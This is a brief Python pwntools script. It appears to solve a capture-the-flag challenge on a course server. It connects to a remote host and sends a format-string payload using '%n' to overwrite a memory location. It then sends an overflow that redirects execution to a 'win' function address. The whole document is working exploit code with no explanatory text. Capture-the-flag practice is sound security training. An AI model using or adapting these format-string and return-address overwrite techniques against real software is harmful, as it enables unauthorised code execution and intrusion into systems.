from pwn import *

context.clear(arch='amd64', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

offset = 40 + 3
winAddr = p64(0x5555555548fa)
targetAddr = p64(0x55555575504c)

payload = b'a'+b'%2988c%9$n' +  targetAddr

r = remote("cs4401shell.walls.ninja",42730)
r.recv()
r.recv()
r.sendline(payload)
r.recv()
r.recv()
r.sendline(flat({offset:winAddr}))
r.recv()
